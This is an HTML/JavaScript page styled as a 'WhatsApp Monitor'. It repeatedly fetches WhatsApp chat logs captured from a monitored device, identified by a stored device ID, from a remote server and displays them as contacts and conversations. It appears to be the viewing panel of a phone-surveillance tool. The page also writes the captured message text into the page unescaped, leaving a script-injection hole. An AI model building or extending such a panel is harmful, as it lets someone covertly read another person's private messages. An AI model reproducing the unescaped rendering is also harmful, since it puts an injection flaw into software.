<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>WhatsApp Monitor</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        /* --- WHATSAPP DARK THEME --- */
        body { 
            margin: 0; background-color: #111b21; font-family: Helvetica, Arial, sans-serif; 
            color: #e9edef; height: 100vh; overflow: hidden; display: flex; justify-content: center;
        }
        .app-container {
            width: 100%; height: 100%; max-width: 450px; background-color: #111b21;
            position: relative; box-shadow: 0 0 20px rgba(0,0,0,0.5); display: flex; flex-direction: column;
        }

        /* VIEW 1: CONTACT LIST */
        #contactListView { display: flex; flex-direction: column; height: 100%; width: 100%; }
        .main-header {
            padding: 10px 15px; display: flex; align-items: center; gap: 15px;
            background-color: #202c33; border-bottom: 1px solid #2a3942; z-index: 5; height: 40px;
        }
        .back-btn-main { font-size: 1.2rem; color: #aebac1; cursor: pointer; }
        .app-title { font-size: 1.3rem; font-weight: bold; color: #8696a0; flex: 1; }
        .top-icons { display: flex; gap: 20px; color: #aebac1; font-size: 1.1rem; }

        .contact-list { flex: 1; overflow-y: auto; position: relative; }
        
        /* Loading Animation */
        .loader-container {
            display: flex; flex-direction: column; align-items: center; justify-content: center;
            padding-top: 50px; color: #00a884;
        }
        .spinner {
            border: 4px solid #2a3942; border-top: 4px solid #00a884; border-radius: 50%;
            width: 30px; height: 30px; animation: spin 1s linear infinite; margin-bottom: 10px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        .contact-item { display: flex; align-items: center; padding: 12px 15px; cursor: pointer; border-bottom: 1px solid #222; }
        .contact-item:active { background: #202c33; }
        .dp-circle { width: 45px; height: 45px; border-radius: 50%; background: #667781; display: flex; justify-content: center; align-items: center; margin-right: 15px; color: #fff; font-size: 1.2rem; }
        .contact-info { flex: 1; }
        .row-top { display: flex; justify-content: space-between; margin-bottom: 4px; }
        .name { font-size: 1rem; font-weight: 500; color: #e9edef; }
        .time { font-size: 0.75rem; color: #8696a0; }
        .last-msg { font-size: 0.85rem; color: #8696a0; display: -webkit-box; -webkit-line-clamp: 1; -webkit-box-orient: vertical; overflow: hidden; }

        /* VIEW 2: CHAT */
        #chatDetailView { display: none; flex-direction: column; height: 100%; position: absolute; top: 0; left: 0; width: 100%; background: #0b141a; z-index: 10; }
        .chat-header { background-color: #202c33; padding: 5px 10px; display: flex; align-items: center; gap: 10px; height: 50px; }
        .back-arrow { font-size: 1.2rem; color: #aebac1; padding: 8px; cursor: pointer; }
        .chat-area { 
            flex: 1; padding: 15px; overflow-y: auto; display: flex; flex-direction: column;
            background-image: url('https://user-images.githubusercontent.com/15075759/28719144-86dc0f70-73b1-11e7-911d-60d70fcded21.png');
            background-size: 400px; background-color: #0b141a; 
        }
        .message { max-width: 75%; margin-bottom: 5px; padding: 6px 10px 8px 9px; border-radius: 8px; font-size: 0.9rem; position: relative; line-height: 1.3; word-wrap: break-word; }
        .msg-left { background-color: #202c33; align-self: flex-start; border-top-left-radius: 0; color: #fff; }
        .msg-time { font-size: 0.65rem; color: #aebac1; float: right; margin-top: 5px; margin-left: 8px; }
        .chat-footer { background-color: #202c33; padding: 8px 10px; display: flex; align-items: center; gap: 10px; }
        .fake-input { flex: 1; background: #2a3942; padding: 10px 15px; border-radius: 20px; color: #8696a0; font-size: 0.95rem; border: none; outline: none; }
    </style>
</head>
<body>

    <div class="app-container">
        
        <div id="contactListView">
            <div class="main-header">
                <i class="fa-solid fa-arrow-left back-btn-main" onclick="window.location.href='index.html'"></i>
                <span class="app-title">WhatsApp</span>
                <div class="top-icons">
                    <i class="fa-solid fa-camera"></i>
                    <i class="fa-solid fa-magnifying-glass"></i>
                    <i class="fa-solid fa-ellipsis-vertical"></i>
                </div>
            </div>
            <div class="contact-list" id="contactsContainer">
                <div class="loader-container">
                    <div class="spinner"></div>
                    <p id="statusText">Connecting...</p>
                </div>
            </div>
        </div>

        <div id="chatDetailView">
            <div class="chat-header">
                <i class="fa-solid fa-arrow-left back-arrow" onclick="closeChat()"></i>
                <div class="dp-circle" style="width: 35px; height: 35px; margin-right: 10px;">
                    <i class="fa-solid fa-user"></i>
                </div>
                <div style="flex: 1;">
                    <h3 id="headerName" style="margin:0; font-size: 1rem; font-weight: 500;">User</h3>
                </div>
                <i class="fa-solid fa-video" style="color: #aebac1; margin-right: 20px;"></i>
                <i class="fa-solid fa-phone" style="color: #aebac1; margin-right: 15px;"></i>
                <i class="fa-solid fa-ellipsis-vertical" style="color: #aebac1;"></i>
            </div>
            <div class="chat-area" id="messagesContainer"></div>
            <div class="chat-footer">
                <i class="fa-solid fa-plus" style="color: #8696a0; font-size: 1.2rem;"></i>
                <input type="text" class="fake-input" placeholder="Message" readonly>
                <i class="fa-solid fa-microphone" style="color: #8696a0; font-size: 1.2rem;"></i>
            </div>
        </div>

    </div>

    <script>
        const DEVICE_ID = localStorage.getItem('monitoring_id');
        
        // --- 1. FIXED BASE URL (Added /api/get-data) ---
        const BASE_URL = "https://child-v9no.onrender.com/api/get-data"; 

        if (!DEVICE_ID) {
            alert("Device ID Missing!");
            window.location.href = 'index.html';
        }

        let groupedChats = {};

        async function fetchWhatsAppData() {
            const statusText = document.getElementById('statusText');
            
            // Server wake up message logic
            setTimeout(() => {
                if(statusText) statusText.innerText = "Waking up server (Wait 30s)...";
            }, 3000);

            try {
                // --- 2. FIXED FETCH URL STRUCTURE ---
                // Backend Route: /api/get-data/:device_id/:type
                // Hum 'chat_logs' mangwa rahe hain kyunki wahi data save hota hai
                const finalUrl = `${BASE_URL}/${DEVICE_ID}/chat_logs`;
                
                console.log("Fetching:", finalUrl); // Debugging ke liye

                const response = await fetch(finalUrl);
                const result = await response.json();

                // Backend array return karega, isliye check array ka lagaya hai
                if (Array.isArray(result) && result.length > 0) {
                    processLogs(result);
                } else {
                    document.getElementById('contactsContainer').innerHTML = "<p style='text-align:center; color:#888; margin-top:20px'>No Data Found</p>";
                }
            } catch (error) {
                console.error("Fetch Error:", error);
                document.getElementById('contactsContainer').innerHTML = 
                    `<div style='text-align:center; color:#ff5f5f; margin-top:50px'>
                        <i class="fa-solid fa-triangle-exclamation" style="font-size:2rem; margin-bottom:10px;"></i><br>
                        Connection Error.<br>Server might be sleeping.<br>
                        <button onclick="location.reload()" style="background:#00a884; color:white; border:none; padding:8px 15px; margin-top:10px; border-radius:5px;">Retry</button>
                    </div>`;
            }
        }

        function processLogs(logs) {
            groupedChats = {};
            // Sort Old -> New
            logs.sort((a, b) => (a.time || 0) - (b.time || 0));

            let currentSender = "Recent Messages"; 

            logs.forEach(log => {
                // Backend server 'chat_logs' bhej raha hai, usme 'app' check karna zaroori hai
                if (log.app === 'WhatsApp') {
                    let text = (log.text || "").trim();
                    let time = log.time || Date.now();

                    // --- FILTERING (Kachra Hatao) ---
                    if (text.includes("last seen") || text.includes("online") || 
                        text.includes("typing") || /^\d{1,2}:\d{2}\s?(am|pm)$/i.test(text)) {
                        return; 
                    }

                    // --- NAME LOGIC ---
                    if (text.length < 20 && !text.includes(" ") && !text.includes("http") && isNaN(text)) {
                        currentSender = text; 
                        if (!groupedChats[currentSender]) {
                            groupedChats[currentSender] = { name: currentSender, lastMsg: "Active", time: time, msgs: [] };
                        }
                    } else {
                        if (!groupedChats[currentSender]) {
                            groupedChats[currentSender] = { name: currentSender, lastMsg: "", time: time, msgs: [] };
                        }
                        groupedChats[currentSender].msgs.push({
                            text: text,
                            timeStr: new Date(time).toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'})
                        });
                        groupedChats[currentSender].lastMsg = text;
                        groupedChats[currentSender].time = time;
                    }
                }
            });

            renderList();
        }

        function renderList() {
            const container = document.getElementById('contactsContainer');
            const names = Object.keys(groupedChats);

            if (names.length === 0) {
                container.innerHTML = "<p style='text-align:center; padding-top:20px; color:#888'>No WhatsApp chats found in logs.</p>";
                return;
            }

            names.sort((a, b) => groupedChats[b].time - groupedChats[a].time);

            let html = "";
            names.forEach(name => {
                const chat = groupedChats[name];
                if(chat.msgs.length === 0 && name === "Recent Messages") return; 

                html += `
                    <div class="contact-item" onclick="openChat('${name}')">
                        <div class="dp-circle"><i class="fa-solid fa-user"></i></div>
                        <div class="contact-info">
                            <div class="row-top">
                                <span class="name">${chat.name}</span>
                                <span class="time">${new Date(chat.time).toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'})}</span>
                            </div>
                            <div class="last-msg">${chat.lastMsg}</div>
                        </div>
                    </div>`;
            });
            container.innerHTML = html;
        }

        function openChat(name) {
            const chat = groupedChats[name];
            document.getElementById('headerName').innerText = chat.name;
            const msgBox = document.getElementById('messagesContainer');
            msgBox.innerHTML = "";

            chat.msgs.forEach(m => {
                msgBox.innerHTML += `
                    <div class="message msg-left">
                        ${m.text}
                        <span class="msg-time">${m.timeStr}</span>
                    </div>`;
            });

            document.getElementById('contactListView').style.display = 'none';
            document.getElementById('chatDetailView').style.display = 'flex';
            msgBox.scrollTop = msgBox.scrollHeight;
        }

        function closeChat() {
            document.getElementById('chatDetailView').style.display = 'none';
            document.getElementById('contactListView').style.display = 'flex';
        }

        // Start Fetching
        fetchWhatsAppData();
        // Refresh every 7 seconds
        setInterval(fetchWhatsAppData, 7000); 

    </script>
</body>
</html>
